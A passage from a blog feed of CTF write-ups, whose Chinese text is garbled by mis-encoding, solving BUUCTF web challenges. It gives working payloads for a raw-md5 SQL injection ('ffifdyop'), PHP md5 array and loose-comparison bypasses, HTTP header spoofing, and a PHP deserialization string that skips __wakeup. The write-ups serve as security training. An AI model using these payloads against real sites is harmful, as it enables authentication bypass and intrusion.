)<br>ä»–è¦æ±‚æˆ‘ä»¬POSTçš„å‚æ•°passwdçš„å€¼ç±»å‹ä¸ä¸ºæ•°å­—ï¼Œä½†æ˜¯åˆåˆ¤æ–­passwdçš„å€¼æ˜¯éƒ½ç­‰äº1234567ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¼±ç­‰äºç»•è¿‡</p><p>æ„é€ ç¬¬äºŒä¸ªpayloadï¼š<code>password=1234567a</code></p><p>æœ€åï¼Œé€šè¿‡hackbarä¸Šä¼ æˆ‘ä»¬çš„payloadå³å¯è·å–flag<img src="/buuctf4.assets/image-20210710103012191.png" alt="image-20210710103012191"></p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°å°±ä¸€ä¸ªæŸ¥è¯¢æ¡†ï¼ŒæŸ¥çœ‹æºç æ²¡å‘ç°ä»€ä¹ˆé‡è¦çš„ä¿¡æ¯ã€‚</p><p>éšæœºè¾“å…¥æ•°å­—1ï¼Œå‘ç°æ²¡ä»€ä¹ˆå›æ˜¾ï¼Œä½†æ˜¯çœ‹åˆ°URLæ è·³å‡ºpasswd=1</p><p>å°è¯•æŠ“åŒ…ï¼š</p><p><img src="/buuctf4.assets/image-20210710174945601.png" alt="image-20210710174945601"></p><p>å‘ç°å›æ–‡ä¸­è—ç€hintâ€”â€”å°†æˆ‘ä»¬è¾“å…¥ä¸Šä¼ çš„passwdç»è¿‡md5ç¼–ç åå¸¦å…¥sqlæŸ¥è¯¢è¯­å¥ã€‚</p><p>è¿™é‡Œä»‹ç»ä¸€ä¸‹md5()å‡½æ•°ï¼š</p><p><strong>è¯­æ³•</strong>ï¼š<code>md5(string,raw)</code></p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>string</em></td><td>å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td><em>raw</em></td><td>å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼š  TRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼                                                                                                                               FALSE - é»˜è®¤ã€‚32 å­—ç¬¦åå…­è¿›åˆ¶æ•°</td></tr></tbody></table><p>**sp:**åŸå§‹äºŒè¿›åˆ¶æ•°æ®ä¸æ˜¯æŒ‡0101è¿™äº›äºŒè¿›åˆ¶æ•°æ®ï¼Œè€Œæ˜¯åŸå§‹å­—ç¬¦ä¸²è½¬æ¢æˆasciiç åç»„æˆçš„å­—ç¬¦ä¸²ã€‚</p><p>å…³äºmd5è¾“å‡ºåŸå§‹äºŒè¿›åˆ¶çš„è½¬æ¢è¿‡ç¨‹å’Œæœºåˆ¶å‚è€ƒåšå®¢ï¼š<a href="https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/">https://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/</a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æç¤ºè¦æ±‚æˆ‘ä»¬è¾“å…¥çš„passwdç»è¿‡md5ç¼–ç åè¦ç­‰äºçœŸçš„å¯†ç ï¼Œä½†æ˜¯æˆ‘ä»¬æ€ä¹ˆä¼šçŸ¥é“å¯†ç å‘¢ï¼Œé‚£ä¹ˆå…³é”®ç‚¹è‚¯å®šå°±æ˜¯åœ¨md5ä¸Šã€‚é€šè¿‡æŸ¥é˜…èµ„æ–™æˆ‘ä»¬å¾—çŸ¥å¯ä»¥ä½¿ç”¨<code>ffifdyop</code>ç»•è¿‡ï¼Œå…¶ç»è¿‡<code>md5(ffifdyop,raw)</code>åä¸º<code>&#39;or&#39;6xxxxxxxxxx</code>ï¼›</p><p>å¸¦å…¥sqlè¯­å¥ä¸­ä¸ºï¼š<code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxxxxxx&#39;</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æ„æˆäº†ä¸€å¥ç”¨çœŸå¼ã€‚é‚£ä¹ˆè¿™æ—¶å¸¦å…¥æ•°æ®åº“ä¸­å°±ä¸ä¼šè¿”å›ç©ºäº†ã€‚</p><p>è¾“å…¥ffifdyopåè·³è½¬åˆ°ä¸€ä¸ªæ–°çš„é¡µé¢ï¼ŒæŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ç”¨æ•°ç»„ç»•è¿‡md5å³å¯ï¼Œæ„é€ payloadï¼š<code>?a[]=a&amp;b[]=b</code>   ç»•è¿‡</p><p>æœ‰è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œåˆæ˜¯ä¸€ä¸²ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä¾æ—§é‡‡ç”¨æ•°ç»„ç»•è¿‡md5å³å¯ï¼š<img src="/buuctf4.assets/image-20210710214847048.png" alt="image-20210710214847048"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯åé¢ä¸€ä¸ªç­‰å·æ˜¯å¼ºç­‰äºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨å“ˆå¸Œç¢°æ’æ¥ç»•è¿‡md5ã€‚å› ä¸ºPHPå¼ºç­‰äºæ—¶å°±ä¸ä¼šæŠŠä»¥0Eå¼€å¤´çš„å“ˆå¸Œå€¼è§£é‡Šä¸º0ã€‚</p><p><strong>spï¼š</strong>æœ€è¿‘è¿˜åšäº†è›®å¤šmd5ç»•è¿‡çš„é¢˜ï¼Œæœ‰ä¸€ä¸ªå…³äºmd5ç»•è¿‡çš„åšå®¢å†™çš„æŒºå…¨é¢çš„ï¼š<a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL&quot;&gt;&lt;a href=&quot;#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL&quot; class=&quot;headerlink&quot; title=&quot;[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL&quot;&gt;&lt;/a&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL&lt;/h1&gt;&lt;p&gt;æ‰“å¼€å®¹å™¨</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</title>
    <link href="http://example.com/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-05-22T02:37:59.000Z</published>
    <updated>2021-05-22T03:38:21.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åºåˆ—å’Œååºåˆ—åŒ–ï¼š"><a href="#åºåˆ—å’Œååºåˆ—åŒ–ï¼š" class="headerlink" title="åºåˆ—å’Œååºåˆ—åŒ–ï¼š"></a>åºåˆ—å’Œååºåˆ—åŒ–ï¼š</h1><p>ç®€å•æ¥è¯´ï¼š</p><p>åºåˆ—åŒ–â€”â€”å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ã€‚</p><p>ååºåˆ—åŒ–â€”â€”å°†å­—ç¬¦ä¸²è½¬æ¢æˆå˜é‡æˆ–å¯¹è±¡çš„è¿‡ç¨‹ã€‚</p><p><img src="/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20210522104245613.png" alt="image-20210522104245613"></p><h2 id="å¸¸è§çš„é­”æœ¯æ–¹æ³•ï¼š"><a href="#å¸¸è§çš„é­”æœ¯æ–¹æ³•ï¼š" class="headerlink" title="å¸¸è§çš„é­”æœ¯æ–¹æ³•ï¼š"></a>å¸¸è§çš„é­”æœ¯æ–¹æ³•ï¼š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_construct()ï¼šåˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–</span><br><span class="line">_destruction()ï¼šç»“æŸæ—¶é”€æ¯å¯¹è±¡</span><br><span class="line">_toString()ï¼šå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶ä½¿ç”¨</span><br><span class="line">_sleep()ï¼šåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨</span><br><span class="line">_wakeup()ï¼šååºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨</span><br><span class="line">_call()ï¼šè°ƒç”¨å¯¹è±¡ä¸å­˜åœ¨æ—¶ä½¿ç”¨</span><br><span class="line">_get()ï¼šè°ƒç”¨ç§æœ‰å±æ€§æ—¶ä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="å¸¸è§çš„è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦"><a href="#å¸¸è§çš„è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦" class="headerlink" title="å¸¸è§çš„è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦"></a>å¸¸è§çš„è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public(å…¬æœ‰)</span><br><span class="line">protected(å—ä¿æŠ¤)</span><br><span class="line">private(ç§æœ‰çš„)</span><br><span class="line">protectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00*%00å±æ€§å</span><br><span class="line">privateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00ç±»å%00å±æ€§å</span><br></pre></td></tr></table></figure><p>å€Ÿé˜…èµ„æ–™ï¼š</p><p><a href="https://blog.csdn.net/bmth666/article/details/104737025">https://blog.csdn.net/bmth666/article/details/104737025</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åºåˆ—å’Œååºåˆ—åŒ–ï¼š&quot;&gt;&lt;a href=&quot;#åºåˆ—å’Œååºåˆ—åŒ–ï¼š&quot; class=&quot;headerlink&quot; title=&quot;åºåˆ—å’Œååºåˆ—åŒ–ï¼š&quot;&gt;&lt;/a&gt;åºåˆ—å’Œååºåˆ—åŒ–ï¼š&lt;/h1&gt;&lt;p&gt;ç®€å•æ¥è¯´ï¼š&lt;/p&gt;
&lt;p&gt;åºåˆ—åŒ–â€”â€”å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;ååºåˆ—åŒ–</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf3</title>
    <link href="http://example.com/2021/05/21/buuctf3/"/>
    <id>http://example.com/2021/05/21/buuctf3/</id>
    <published>2021-05-21T13:20:13.000Z</published>
    <updated>2021-05-22T12:01:41.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h1><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h1><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="/buuctf3.assets/image-20210521234401142.png" alt="image-20210521234401142"></p><p>è®¿é—®Secret.php<img src="/buuctf3.assets/image-20210521234640211.png" alt="image-20210521234640211"></p><p>è¿™é¢˜åº”è¯¥æ˜¯ä¼ªé€ HTTPåè®®ï¼ŒburpæŠ“åŒ…ï¼Œä¼ªé€ Refererï¼š</p><p><img src="/buuctf3.assets/image-20210521235247759.png"></p><p>ä»–è¦æ±‚æˆ‘ä»¬ç”¨Sycloverï¼Œä¼ªé€ User-Agentï¼š</p><p><img src="/buuctf3.assets/image-20210521235448143.png" alt="image-20210521235448143"></p><p>ä»–åˆè¦æ±‚åªèƒ½æœ¬åœ°è®¿é—®ï¼Œä¼ªé€ X-Forwarded-Forï¼š</p><p><img src="/buuctf3.assets/image-20210521235637487.png" alt="image-20210521235637487"></p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1><p>æ‰“å¼€å®¹å™¨ï¼š<img src="/buuctf3.assets/image-20210522105040083.png" alt="image-20210522105040083"></p><p>å‘ç°è¿™æ ·ä¸€å¥è¯ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œç”¨dirsearchæ‰«æä¸€ä¸‹ï¼Œä½†æ˜¯è¿™ä¸ªç½‘å€çš„æœåŠ¡å™¨å¯èƒ½åšå¾—ä¸å¤§å¥½ä¼šæ‰«å´©ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥æ‰‹å·¥æµ‹è¯•ä¸€ä¸‹ã€‚å°è¯•<a href="http://www.zipï¼š![image-20210522105338750](buuctf3.assets/image-20210522105338750.png)">www.zipï¼š![image-20210522105338750](buuctf3.assets/image-20210522105338750.png)</a></p><p>æŸ¥é˜…æœ‰å‘ç°å°±ä¸¤ä¸ªæ–‡ä»¶æœ‰ç”¨ï¼š<img src="/buuctf3.assets/image-20210522105452036.png" alt="image-20210522105452036"></p><p><strong>class.phpï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>index.php:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;meyer-reset&#x2F;2.0&#x2F;reset.min.css&quot;&gt;</span><br><span class="line">      &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #login&#123;   </span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line">        left:50%;   </span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line">        margin: 0.67em 0;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;world&quot;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;å› ä¸ºæ¯æ¬¡çŒ«çŒ«éƒ½åœ¨æˆ‘é”®ç›˜ä¸Šä¹±è·³ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸€ä¸ªè‰¯å¥½çš„å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;ä¸æ„§æ˜¯æˆ‘ï¼ï¼ï¼</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;three.js&#x2F;r70&#x2F;three.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;gsap&#x2F;1.16.1&#x2F;TweenMax.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;OrbitControls.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;Cat.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script  src&#x3D;&quot;index.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶ä¸­å…³é”®çš„ä»£ç æ®µï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">$select = $_GET[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ï¼Œå½“username=adminï¼Œpassword=100æ—¶è¾“å‡ºflagã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªéº»çƒ¦ï¼Œ<code>__wakeup()</code>é­”æœ¯æ–¹æ³•ä¼šåœ¨ååºåˆ—åŒ–å‰è·³å‡ºæ¥æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯usernameè¢«èµ‹å€¼guestï¼Œå°±ç ´åäº†è¾“å‡ºflagçš„æ¡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åŠæ³•ç»•è¿‡<code>__wakeup()</code>é­”æœ¯æ–¹æ³•ï¼šåœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œå±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡ __wakeup()å‡½æ•°çš„æ‰§è¡Œã€‚</p><p><strong>æˆ‘ä»¬å°è¯•æ„é€ payloadï¼š</strong></p><p><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p><p><strong>è¿™é‡Œè¦æ³¨æ„ï¼š</strong>ç”±äºè¿™é‡Œçš„usernameå’Œpasswordå±äºprivateå˜é‡ï¼ˆprivate å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚ï¼‰ï¼Œå› æ­¤åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šåœ¨å­—æ®µåå‰é¢å¢åŠ æ‰€å±ç±»åï¼Œå¹¶ä¸”ç±»åå’Œå­—æ®µåå‰è¦åŠ å‰ç¼€<code>0</code>ã€‚</p><p><img src="/buuctf3.assets/image-20210522112524139.png" alt="image-20210522112524139"></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªè®¡ç®—æœºï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç ï¼š<img src="/buuctf3.assets/image-20210522185134958.png" 